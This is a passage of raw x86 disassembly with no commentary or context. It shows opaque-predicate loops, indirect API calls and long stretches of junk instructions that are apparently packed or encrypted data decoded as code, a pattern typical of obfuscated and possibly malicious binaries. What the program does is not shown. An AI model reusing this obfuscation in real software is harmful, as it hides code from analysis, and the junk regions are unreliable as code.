  40187a:	and    DWORD PTR ds:0x4304e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4304e3
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x4304e3,esi
  401898:	cmp    DWORD PTR ds:0x4304e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4304e3,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e9ab
  4018bd:	cmp    DWORD PTR ds:0x4304e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4304e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4304e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42edd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42eddb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42eddb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42eddb,esi
  4018fe:	cmp    DWORD PTR ds:0x42eddb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ec0f
  401914:	cmp    DWORD PTR ds:0x42eddb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42eddb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42eddb,esi
  40192e:	cmp    DWORD PTR ds:0x42eddb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42edcb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4304db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4304db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4304db,esi
  401966:	cmp    DWORD PTR ds:0x4304db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4304db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e8b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea97
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43043d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430435,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430435
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430435,ebx
  4019c4:	cmp    DWORD PTR ds:0x430435,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e945
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e9bb
  4019e5:	cmp    DWORD PTR ds:0x430435,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x58c8ea40
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a20
  401a76:	jb     0x401a71
  401a78:	and    edx,DWORD PTR [esi]
  401a7a:	xchg   ecx,eax
  401a7b:	jmp    0x27175b9b
  401a80:	mov    al,0x9
  401a82:	cs jmp 0xc0d8:0x7ea88133
  401a8a:	push   edi
  401a8b:	ret    
  401a8c:	call   0x44e:0x2bdcd553
  401a93:	fwait
  401a94:	dec    ebp
  401a95:	pop    ebx
  401a96:	mov    al,0x18
  401a98:	pop    ebp
  401a99:	js     0x401a72
  401a9b:	sahf   
  401a9c:	pop    es
  401a9d:	mov    DWORD PTR [edi],esp
  401a9f:	outs   dx,BYTE PTR ds:[esi]
  401aa0:	and    BYTE PTR [ecx+ebx*8+0x5a],al
  401aa4:	stc    
  401aa5:	int3   
  401aa6:	call   0x507596c2
  401aab:	or     edi,esp
  401aad:	ret    0xa31f
  401ab0:	pop    esi
  401ab1:	shr    BYTE PTR [edx+0x5],cl
  401ab4:	sub    al,0x95
  401ab6:	ins    DWORD PTR es:[edi],dx
  401ab7:	daa    
  401ab8:	je     0x401a70
  401aba:	test   al,0x4e
  401abc:	shl    ah,1
  401abe:	rol    BYTE PTR [edx-0x1c9d5cc7],cl
  401ac4:	cmc    
  401ac5:	xchg   ebx,eax
  401ac6:	sub    BYTE PTR [edi+0x76],ah
  401ac9:	test   DWORD PTR [edx],eax
  401acb:	fs mov bh,0xdf
  401ace:	cmp    DWORD PTR [edx-0x52ea9b1c],ebp
  401ad4:	loope  0x401a9f
  401ad6:	je     0x401acd
  401ad8:	push   ds
  401ad9:	push   esi
  401ada:	jmp    0x236c:0x7e5b8479
  401ae1:	mov    al,0x3
  401ae3:	sbb    bl,BYTE PTR [edx-0xe]
  401ae6:	or     al,0x1f
  401ae8:	xchg   ecx,eax
  401ae9:	push   ecx
  401aea:	call   0x4891:0x62e1501e
  401af1:	push   edi
  401af2:	jns    0x401a7c
  401af4:	fst    DWORD PTR [ebp-0xf]
  401af7:	mov    ebp,ecx
  401af9:	dec    edi
  401afa:	rcl    DWORD PTR [ebx],0x1a
  401afd:	ins    BYTE PTR es:[edi],dx
  401afe:	inc    esi
  401aff:	xchg   esi,eax
  401b00:	in     al,dx
  401b01:	sub    ebx,esi
  401b03:	in     al,dx
  401b04:	jnp    0x401b45
  401b06:	jmp    0x401af5
  401b08:	into   
  401b09:	test   DWORD PTR [esi+0x7e],eax
  401b0c:	div    DWORD PTR [ecx-0x5f01d81]
  401b12:	fnstcw WORD PTR [edx+0x524e3d2e]
  401b18:	enter  0x60e3,0x78
  401b1c:	clc    
  401b1d:	test   al,0x1b
  401b1f:	or     DWORD PTR [eax-0x7a],ebp
  401b22:	ret    
  401b23:	loopne 0x401ae1
  401b25:	pop    ebp
  401b26:	rol    BYTE PTR [edx],cl
  401b28:	inc    ebp
  401b29:	jno    0x401b56
  401b2b:	mov    ch,0x5f
  401b2d:	sbb    eax,0xe0d430f6
  401b32:	and    BYTE PTR [ebx-0x393b26c6],dl
  401b38:	mov    WORD PTR es:[edi+edi*2+0x5a],?
  401b3d:	ret    0x2e67
  401b40:	push   ecx
  401b41:	shl    BYTE PTR [ebx-0xb],1
  401b44:	stos   BYTE PTR es:[edi],al
  401b45:	jmp    0x401b06
  401b47:	push   eax
  401b48:	mov    bh,BYTE PTR [esi+0x51]
  401b4b:	daa    
  401b4c:	inc    esp
  401b4d:	mov    eax,ds:0x2d641d1e
  401b52:	cld    
  401b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b54:	or     ecx,DWORD PTR [ebx-0x7690a8ed]
  401b5a:	push   0xffffff8a
  401b5c:	jae    0x401b8f
  401b5e:	xchg   BYTE PTR [ebx-0x6c5c7463],al
  401b64:	push   ds
  401b65:	cmp    ebp,esi
  401b67:	sub    ebp,ecx
  401b69:	pushf  
  401b6a:	je     0x401b48
  401b6c:	shl    dl,1
  401b6e:	jb     0x401bb8
  401b70:	mov    dh,0x16
  401b72:	push   ss
  401b73:	hlt    
  401b74:	mov    esp,0xc47097c9
  401b79:	ret    0x4832
  401b7c:	cmp    edx,eax
  401b7e:	data16 sbb al,bh
  401b81:	add    BYTE PTR [ebx-0x30ace7cf],bl
  401b87:	inc    eax
  401b88:	lahf   
  401b89:	mov    ch,0xef
  401b8b:	and    edi,ebx
  401b8d:	(bad)  
  401b8e:	mov    ebx,DWORD PTR [ebx-0x2f]
  401b91:	sub    bl,BYTE PTR [ecx+ecx*1+0x38e2a936]
  401b98:	out    dx,eax
  401b99:	inc    ecx
  401b9a:	push   ebx
  401b9b:	or     edi,DWORD PTR [edi]
  401b9d:	sub    eax,0x5f685228
  401ba2:	outs   dx,BYTE PTR ds:[esi]
  401ba3:	push   ecx
  401ba4:	xchg   ebx,eax
  401ba5:	mov    ah,0xf2
  401ba7:	lods   eax,DWORD PTR ds:[esi]
  401ba8:	pop    eax
  401ba9:	cmp    eax,ecx
  401bab:	fistp  DWORD PTR [ebx]
  401bad:	mov    bl,0x6f
  401baf:	mov    dl,0x67
  401bb1:	and    al,ch
  401bb3:	(bad)  
  401bb4:	shl    eax,cl
  401bb6:	into   
  401bb7:	test   ah,ah
  401bb9:	pop    eax
  401bba:	inc    edi
  401bbb:	push   ds
  401bbc:	out    dx,al
  401bbd:	das    
  401bbe:	jecxz  0x401c0e
  401bc0:	shl    BYTE PTR [ecx],1
  401bc2:	adc    eax,0xb5626c4f
  401bc7:	fstp   DWORD PTR [ecx+0x3f]
  401bca:	mov    ebx,0xbaeb178b
  401bcf:	or     DWORD PTR [ebx-0x7b],esi
  401bd2:	mov    ?,ebp
  401bd4:	mov    al,0x43
  401bd6:	(bad)  
  401bd7:	pop    esp
  401bd8:	cdq    
  401bd9:	stos   BYTE PTR es:[edi],al
  401bda:	lds    esp,FWORD PTR [esi-0x6b569bc1]
  401be0:	call   0x357f3d42
  401be5:	imul   edi,edx,0x28
  401be8:	cmp    ebp,DWORD PTR [eax]
  401bea:	dec    esi
  401beb:	pcmpeqd mm6,QWORD PTR [ecx-0x62d198dc]
  401bf2:	push   cs
  401bf3:	cli    
  401bf4:	adc    eax,0xc30dec68
  401bf9:	rcr    DWORD PTR [ecx+0x62],cl
  401bfc:	adc    esp,DWORD PTR [ecx+edi*2]
  401bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c00:	xchg   edx,eax
  401c01:	push   ecx
  401c02:	push   ecx
  401c03:	xchg   edx,eax
  401c04:	loope  0x401b87
  401c06:	xor    dl,dh
  401c08:	xchg   ecx,eax
  401c09:	ret    0x6bef
  401c0c:	mov    ds:0xc1e5c4bf,eax
  401c11:	comiss xmm7,DWORD PTR [ecx-0x77a6f036]
  401c18:	out    0x88,al
  401c1a:	sub    DWORD PTR [ebp+0x4589f445],ecx
  401c20:	lock mov eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	addr16 icebp 
  401c92:	sbb    eax,ebp
  401c94:	xor    BYTE PTR [esi],al
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c7a
  401c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c9e:	sbb    DWORD PTR [eax],0x5ea11324
  401ca4:	clc    
  401ca5:	inc    edi
  401ca6:	neg    cl
  401ca8:	jl     0x401c9c
  401caa:	mov    edx,0x1c1bcbf4
  401caf:	mov    al,0xc2
  401cb1:	cmc    
  401cb2:	pusha  
  401cb3:	xor    esp,eax
  401cb5:	cwde   
  401cb6:	test   eax,0xe9eab9ed
  401cbb:	lea    edx,[esi+0xf]
  401cbe:	add    al,0xe5
  401cc0:	sbb    DWORD PTR ds:0x586dd208,esp
  401cc6:	sub    eax,DWORD PTR [ebx]
  401cc8:	test   BYTE PTR ds:0x788b8e96,dl
  401cce:	mov    ch,0x56
  401cd0:	repz test al,0x2d
  401cd3:	pop    esp
  401cd4:	das    
  401cd5:	not    DWORD PTR [edx+0x7e7cd4ba]
  401cdb:	loop   0x401cd1
  401cdd:	push   ss
  401cde:	inc    ebp
  401cdf:	ins    BYTE PTR es:[edi],dx
  401ce0:	jae    0x401cb4
  401ce2:	mov    BYTE PTR ds:0xf44e73a9,dl
  401ce8:	(bad)  
  401ce9:	fdivr  DWORD PTR [esi]
  401ceb:	mov    eax,0x413fbe6d
  401cf0:	adc    DWORD PTR [eax+0x2c61abc8],esi
  401cf6:	inc    ebx
  401cf7:	repnz sbb DWORD PTR [edi],eax
  401cfa:	push   ds
  401cfb:	repz add al,0xfb
  401cfe:	inc    ebx
  401cff:	sub    BYTE PTR [esi+0x65],bh
  401d02:	inc    esp
  401d03:	out    0xd2,eax
  401d05:	bound  eax,QWORD PTR [ebx]
  401d07:	cmp    ebp,ecx
  401d09:	fidivr WORD PTR [ecx]
  401d0b:	leave  
  401d0c:	jns    0x401d15
  401d0e:	pop    esi
  401d0f:	push   edi
  401d10:	add    esi,ebx
  401d12:	jg     0x401d6a
  401d14:	out    dx,eax
  401d15:	popf   
  401d16:	or     DWORD PTR [ebp-0x4d],ebx
  401d19:	icebp  
  401d1a:	jmp    0xc7c0:0x60e14fe
  401d21:	push   cs
  401d22:	or     edi,esp
  401d24:	retf   0xf15
  401d27:	mov    eax,ds:0x9efdade9
  401d2c:	xor    al,0x28
  401d2e:	mov    ebp,0x4d3b5732
  401d33:	sbb    BYTE PTR [esi-0x7b],cl
  401d36:	fistp  QWORD PTR [ebp+edx*8-0x6c687ca]
  401d3d:	cmc    
  401d3e:	out    dx,al
  401d3f:	repz jecxz 0x401d0c
  401d42:	cmp    DWORD PTR [edx],ebp
  401d44:	fsubr  QWORD PTR [eax+0x13921545]
  401d4a:	push   ds
  401d4b:	cmc    
  401d4c:	stos   BYTE PTR es:[edi],al
  401d4d:	dec    edx
  401d4e:	in     eax,0xbb
  401d50:	mov    dh,0xd3
  401d52:	mov    edi,0xf0bfa855
  401d57:	int3   
  401d58:	dec    edi
  401d59:	cmp    eax,0xbccd6801
  401d5e:	popa   
  401d5f:	sbb    eax,0x7c238b3
  401d64:	fimul  DWORD PTR ds:0x7361f96b
  401d6a:	daa    
  401d6b:	fcomp  QWORD PTR [edx]
  401d6d:	imul   ebp,DWORD PTR [ecx+0x5a],0xcfd5e143
  401d74:	call   0x86bd:0xe5e78162
  401d7b:	inc    edx
  401d7c:	mov    dh,0xc8
  401d7e:	int    0xd6
  401d80:	push   ds
  401d81:	mov    dh,0x28
  401d83:	pop    ebx
  401d84:	or     eax,0x37796b1b
  401d89:	cmp    eax,ebx
  401d8b:	mov    WORD PTR [edx+0x7da01652],?
  401d91:	out    0x13,eax
  401d93:	and    eax,0xd56c2d17
  401d98:	pmullw mm3,QWORD PTR [ecx]
  401d9b:	dec    eax
  401d9c:	and    ah,bl
  401d9e:	xor    al,BYTE PTR ds:0xd3be8a58
  401da4:	das    
  401da5:	fbld   TBYTE PTR [ecx-0x74]
  401da8:	test   DWORD PTR [esi-0x22],ebx
  401dab:	shl    BYTE PTR [edx+eax*8-0x68],cl
  401daf:	xor    esp,DWORD PTR [ebx]
  401db1:	hlt    
  401db2:	sub    DWORD PTR [ebp-0x4b],edi
  401db5:	mov    esp,0x4806a9ba
  401dba:	mov    edx,DWORD PTR [ecx+0x28978612]
  401dc0:	cs dec edi
  401dc2:	lods   al,BYTE PTR ds:[esi]
  401dc3:	push   eax
  401dc4:	sbb    esp,edi
  401dc6:	shl    DWORD PTR [edi],cl
  401dc8:	outs   dx,BYTE PTR ds:[esi]
  401dc9:	xlat   BYTE PTR ds:[ebx]
  401dca:	jg     0x401e36
  401dcc:	xchg   ecx,eax
  401dcd:	les    eax,FWORD PTR [ebx+0x3b06fda1]
  401dd3:	xchg   DWORD PTR es:[edx-0x42ec559e],eax
  401dda:	scas   eax,DWORD PTR es:[edi]
  401ddb:	pop    ds
  401ddc:	add    DWORD PTR [eax+0x53],edx
  401ddf:	mov    edi,0xe45812da
  401de4:	mov    ecx,0x3d6aeffe
  401de9:	out    dx,al
  401dea:	mov    esp,0x7b7d6202
  401def:	fsubr  QWORD PTR [esi]
  401df1:	cwde   
  401df2:	xor    ch,bh
  401df4:	ja     0x401dea
  401df6:	cli    
  401df7:	adc    eax,0x49118e87
  401dfc:	lods   al,BYTE PTR ds:[esi]
  401dfd:	sbb    al,0x58
  401dff:	js     0x401dcb
  401e01:	or     BYTE PTR ds:0xda697e68,al
  401e07:	xor    edi,edi
  401e09:	les    eax,FWORD PTR [edx+0x399c1173]
  401e0f:	stos   DWORD PTR es:[edi],eax
  401e10:	clc    
  401e11:	(bad)  
  401e12:	lods   eax,DWORD PTR ds:[esi]
  401e13:	add    esp,DWORD PTR [esi-0x71]
  401e16:	stos   BYTE PTR es:[edi],al
  401e17:	scas   eax,DWORD PTR es:[edi]
  401e18:	(bad)  
  401e1a:	scas   al,BYTE PTR es:[edi]
  401e1b:	adc    al,cl
  401e1d:	in     al,0xf5
  401e1f:	(bad)  
  401e21:	mov    ds:0x4895608e,eax
  401e26:	lahf   
  401e27:	arpl   di,bx
  401e29:	or     edi,DWORD PTR [ecx]
  401e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e2c:	inc    esp
  401e2d:	jp     0x401e42
  401e2f:	repz mov ss:0xc087863a,eax
  401e36:	in     eax,dx
  401e37:	icebp  
  401e38:	mov    DWORD PTR [edi+ebp*4-0x5c],esp
  401e3c:	sbb    BYTE PTR [edi-0x3f18695],ch
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	test   bl,0x2e
  401e83:	cvtps2pd xmm0,QWORD PTR [edi]
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401ed4
  401e8d:	adc    bh,ch
  401e8f:	push   ds
  401e90:	js     0x401f0a
  401e92:	icebp  
  401e93:	jmp    0x8515:0xbceb4a37
  401e9a:	mov    esi,DWORD PTR [ecx+0x21e39232]
  401ea0:	xchg   ebx,eax
  401ea1:	rcr    BYTE PTR [esi+ebx*4-0x5af9b3aa],0x96
  401ea9:	dec    esp
  401eaa:	test   BYTE PTR [esi],0x9c
  401ead:	fcom   DWORD PTR [eax-0x31]
  401eb0:	ins    DWORD PTR es:[edi],dx
  401eb1:	ins    DWORD PTR es:[edi],dx
  401eb2:	jmp    0x401e41
  401eb4:	lods   al,BYTE PTR ds:[esi]
  401eb5:	xor    DWORD PTR ss:[esi-0x4ac061d7],0xdad48afc
  401ec0:	jnp    0x401ebd
  401ec2:	daa    
  401ec3:	stc    
  401ec4:	push   0xd99adf20
  401ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eca:	fistp  DWORD PTR [ecx+0x6b2553fb]
  401ed0:	repnz das 
  401ed2:	cmp    DWORD PTR [ecx-0x76],0x2dfcf077
  401ed9:	outs   dx,BYTE PTR ds:[esi]
  401eda:	xchg   esp,eax
  401edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401edc:	call   0x12f26e5f
  401ee1:	enter  0xd6cb,0xdc
  401ee5:	ins    BYTE PTR es:[edi],dx
  401ee6:	mov    ebx,0x9bfde227
  401eeb:	mov    al,0x51
  401eed:	mov    esp,0xd7bcfa7e
  401ef2:	aas    
  401ef3:	cli    
  401ef4:	push   ecx
  401ef5:	cmp    ebx,esp
  401ef7:	aaa    
  401ef8:	aad    0xa8
  401efa:	lods   al,BYTE PTR ds:[esi]
  401efb:	daa    
  401efc:	jp     0x401e9a
  401efe:	cmp    ebp,DWORD PTR [edx+0x30dd83a9]
  401f04:	mov    cs,WORD PTR [eax-0x5c3622b8]
  401f0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f0b:	cwde   
  401f0c:	rcr    DWORD PTR [edx-0x78d89c6a],cl
  401f12:	jmp    0xa647:0xbdb11850
  401f19:	imul   edi,DWORD PTR [edx+0x22987864],0x9bd87a77
  401f23:	cmp    ah,dh
  401f25:	mov    ss:0x331ac17b,eax
  401f2b:	adc    dl,BYTE PTR [esi+0x7c]
  401f2e:	or     al,0x88
  401f30:	xchg   edi,eax
  401f31:	add    dh,bh
  401f33:	aam    0x93
  401f35:	adc    ecx,DWORD PTR [ebp-0x1c]
  401f38:	push   edx
  401f39:	jmp    0xefe4488c
  401f3e:	lea    ecx,[eax+0x41]
  401f41:	push   0xffffffdf
  401f43:	call   0x36bf:0xa06a9b97
  401f4a:	pushf  
  401f4b:	adc    DWORD PTR [edx+0x64],eax
  401f4e:	test   al,0x73
  401f50:	out    0xae,eax
  401f52:	inc    ebp
  401f53:	mov    esp,0x3533e32b
  401f58:	sar    DWORD PTR [edx+eax*2+0x6e8fb03e],cl
  401f5f:	jl     0x401f5e
  401f61:	xor    DWORD PTR [ebp-0x630bc364],esi
  401f67:	(bad)  
  401f68:	and    esi,eax
  401f6a:	xor    BYTE PTR [eax],ch
  401f6c:	add    eax,ebp
  401f6e:	cld    
  401f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f70:	jmp    0x401fc4
  401f72:	mov    esp,0xc966644b
  401f77:	loopne 0x401f6b
  401f79:	idiv   DWORD PTR [edi-0x2f563ef2]
  401f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f80:	sub    ebx,edx
  401f82:	cmp    al,0x24
  401f84:	xchg   DWORD PTR [eax+0x38],esi
  401f87:	arpl   WORD PTR [eax-0x63e6f2b6],di
  401f8d:	sub    bl,BYTE PTR [eax]
  401f8f:	xor    BYTE PTR [esi+0x35180c37],dh
  401f95:	jnp    0x401f97
  401f97:	mov    ah,0x31
  401f99:	popa   
  401f9a:	fwait
  401f9b:	ret    
  401f9c:	adc    al,0xa9
  401f9e:	push   ds
  401f9f:	pop    esi
  401fa0:	lock daa 
  401fa2:	loopne 0x401f5b
  401fa4:	sub    BYTE PTR [eax+0x33],dl
  401fa7:	adc    BYTE PTR [edi],0xd3
  401faa:	xor    eax,0x60b2cf76
  401faf:	push   ds
  401fb0:	imul   ebx,ebx,0x32532eb5
  401fb6:	icebp  
  401fb7:	mov    ecx,0x93a2aa03
  401fbc:	dec    ecx
  401fbd:	xor    ah,BYTE PTR [edi+0x6793b774]
  401fc3:	pop    edx
  401fc4:	push   0xffffffa5
  401fc6:	scas   al,BYTE PTR es:[edi]
  401fc7:	mov    WORD PTR [ebp-0x25],?
  401fca:	xor    DWORD PTR [edx+0x48641d4d],0x55
  401fd1:	inc    esi
  401fd2:	xor    al,0xc5
  401fd4:	mov    ebp,0x7969908b
  401fd9:	inc    edx
  401fda:	jo     0x402049
  401fdc:	imul   edx,DWORD PTR [eax-0x69],0x13384159
  401fe3:	in     eax,dx
  401fe4:	out    0x21,al
  401fe6:	and    al,0x3
  401fe8:	ret    
  401fe9:	daa    
  401fea:	push   es
  401feb:	jg     0x401fad
  401fed:	mov    esp,0x6f38ed0b
  401ff2:	dec    edx
  401ff3:	push   0x283ffff7
  401ff8:	push   edx
  401ff9:	push   0x79
  401ffb:	cmp    al,0xc3
  401ffd:	push   esi
  401ffe:	add    DWORD PTR [eax],esi
  402000:	jne    0x401ff5
  402002:	cmp    bl,BYTE PTR [ebp+0x30]
  402005:	sub    eax,0xcadcbbe1
  40200a:	std    
  40200b:	test   DWORD PTR [edi],edx
  40200d:	cwde   
  40200e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200f:	mov    ds:0x39f9085d,eax
  402014:	mov    cl,0x25
  402016:	(bad)  
  402017:	shr    bh,cl
  402019:	sbb    al,0x8e
  40201b:	rcr    BYTE PTR [ebp+0x587fc4cb],0x48
  402022:	cmp    al,BYTE PTR [esi-0x111d0c52]
  402028:	mov    cl,0x5a
  40202a:	adc    al,0x2d
  40202c:	push   ecx
  40202d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40202e:	xchg   ecx,eax
  40202f:	jno    0x401fda
  402031:	pop    ebx
  402032:	add    eax,esi
  402034:	mov    DWORD PTR [ebp-0x30],eax
  402037:	mov    eax,DWORD PTR [ebp-0x34]
  40203a:	mov    dx,WORD PTR [ebp-0x38]
  40203e:	mov    ebx,0x8a3c
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	loope  0x402161
  4020e6:	push   esp
  4020e7:	mov    bl,0x84
  4020e9:	add    eax,0x7f557e7e
  4020ee:	jle    0x40216e
  4020f0:	lds    edi,FWORD PTR [esi+0x55]
  4020f3:	cs pop es
  4020f5:	call   0xdad9e72a
  4020fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020fb:	adc    al,BYTE PTR [eax-0x19]
  4020fe:	cmp    eax,0x81b02156
  402103:	xor    DWORD PTR [ecx],eax
  402105:	jne    0x4020e5
  402107:	mov    ch,0x5b
  402109:	pop    ebx
  40210a:	(bad)  
  40210b:	repnz pop ss
  40210d:	xchg   esp,eax
  40210e:	xor    al,0x43
  402110:	int    0xab
  402112:	xor    ebx,0xffffff99
  402115:	sbb    al,0x5f
  402117:	clc    
